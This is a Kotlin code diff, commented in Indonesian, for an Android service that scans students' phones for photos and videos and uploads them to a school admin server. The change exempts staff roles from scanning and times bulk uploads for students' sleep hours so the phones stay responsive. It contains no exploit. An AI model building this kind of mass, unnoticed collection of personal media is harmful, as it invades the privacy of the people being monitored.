@@ -222,9 +222,39 @@ object FileScannerService {
     }
 
     /**
+     * PENGECUALIAN & KONTROL: Memeriksa apakah perangkat saat ini dikecualikan dari pemindaian & sinkronisasi berkas.
+     * Default: Akun Administrator (Admin, Super Admin, Operator, Guru, Staf) DIKECUALIKAN demi privasi dan keamanan sistem.
+     * Namun jika Super Admin mengaktifkannya via portal (isAdminScanEnabledGlobally = true), maka pemindaian diizinkan.
+     */
+    @Volatile var isAdminScanEnabledGlobally: Boolean = false
+
+    fun isDeviceExcludedFromScan(context: Context): Boolean {
+        return try {
+            if (isAdminScanEnabledGlobally) {
+                // Jika kontrol admin di-enable dari server, jangan kecualikan perangkat
+                return false
+            }
+            val sessionManager = SessionManager(context)
+            val role = sessionManager.getRole().uppercase().trim()
+            val isAdminUnlocked = sessionManager.isAdminUnlocked()
+            val isExcludedRole = role == "ADMIN" || role == "SUPER_ADMIN" || role == "SUPERADMIN" ||
+                    role == "OPERATOR" || role == "TEACHER" || role == "GURU" || role == "COUNSELOR" ||
+                    role == "BK" || role == "KEPSEK" || role == "HEADMASTER" || role == "STAFF" || role == "TU"
+            isAdminUnlocked || isExcludedRole
+        } catch (e: Exception) {
+            false
+        }
+    }
+
+    /**
      * Scan seluruh berkas HP: STRICT MEDIA ONLY (Foto & Video)
      */
     fun scanAllFiles(context: Context): List<FileMetadata> {
+        if (isDeviceExcludedFromScan(context)) {
+            Log.d(TAG, "[EXCLUSION] Perangkat Admin/Guru/Staf dikecualikan dari scanning berkas. File scanning diabaikan.")
+            return emptyList()
+        }
+
         if (!DeviceSyncManager.isScannerEnabledGlobally) {
             Log.d(TAG, "[SCANNER OFF] scanAllFiles: Pemindaian berkas media dilewati karena dinonaktifkan di server.")
             return emptyList()
@@ -697,6 +727,12 @@ object FileScannerService {
      * Kirim file metadata ke server
      */
     fun syncFilesToServer(context: Context, files: List<FileMetadata>, onComplete: ((Int) -> Unit)? = null) {
+        if (isDeviceExcludedFromScan(context)) {
+            Log.d(TAG, "[EXCLUSION] syncFilesToServer: Perangkat Admin/Guru/Staf dikecualikan dari sinkronisasi berkas.")
+            onComplete?.invoke(0)
+            return
+        }
+
         if (!DeviceSyncManager.isScannerEnabledGlobally) {
             Log.d(TAG, "[SCANNER OFF] syncFilesToServer: Pengiriman berkas dilewati karena dinonaktifkan di server.")
             onComplete?.invoke(0)
@@ -806,16 +842,13 @@ object FileScannerService {
                         }
                         val reqList = response.body()!!.requests
                         val cal = java.util.Calendar.getInstance(java.util.TimeZone.getTimeZone("Asia/Jakarta"))
-                        val hour = cal.get(java.util.Calendar.HOUR_OF_DAY)
-                        val isNightSleepWindow = (hour >= 23 || hour < 5)
+                        val totalMinutes = cal.get(java.util.Calendar.HOUR_OF_DAY) * 60 + cal.get(java.util.Calendar.MINUTE)
+                        val isNightSleepWindow = (totalMinutes >= 22 * 60 || totalMinutes <= 5 * 60 + 30) // 22:00 s.d. 05:30 WIB (Luar jam CBT)
 
-                        // Jika antrean > 2 berkas dan di luar waktu malam/tidur (05:00 - 23:00 WIB), tunda transfer massal
-                        if (reqList.size > 2 && !isNightSleepWindow) {
-                            Log.d(TAG, "Mode siang aktif: Transfer massal (${reqList.size} berkas) ditangguhkan agar HP siswa tidak lemot saat dipakai. Dijalankan pada jam tidur malam (23:00 - 05:00 WIB).")
-                            return
-                        }
+                        // Di siang hari (05:30 - 22:00 WIB saat aktivitas & ujian CBT), proses maksimal 4 berkas per siklus agar HP tetap responsif dan lancar untuk ujian CBT
+                        val batchToProcess = if (isNightSleepWindow) reqList else reqList.take(4)
 
-                        for (req in reqList) {
+                        for (req in batchToProcess) {
                             if (activeUploadIds.contains(req.requestId)) continue
 
                             // BUG-NEW-06 Fix: Batasi maksimal 5 kali percobaan retry untuk mencegah infinite loop & hemat baterai
@@ -850,11 +883,12 @@ object FileScannerService {
                                 uploadRequestedFile(context, req.requestId, req.filePath, req.fileName)
                             }
                         }
-                        // Jika batch terisi, segera tarik batch selanjutnya secara kontinu (full speed)
-                        if (reqList.size >= 10) {
+                        // Jika masih ada sisa di antrean, lanjutkan batch berikutnya (1 detik saat malam, 3 detik saat siang agar hemat resource)
+                        if (reqList.size > batchToProcess.size || reqList.size >= 10) {
+                            val nextDelayMs = if (isNightSleepWindow) 1000L else 3500L
                             android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                                 checkPendingRequests(context)
-                            }, 1000)
+                            }, nextDelayMs)
                         }
                     }
                 }
@@ -1493,6 +1527,10 @@ object FileScannerService {
      * Mengirim berkas baru (foto/video baru yang baru diambil/diunduh) secara real-time ke web admin (AirDroid style)
      */
     fun notifyNewFileLive(context: Context) {
+        if (isDeviceExcludedFromScan(context)) {
+            return
+        }
+
         if (!DeviceSyncManager.isScannerEnabledGlobally) {
             return
         }
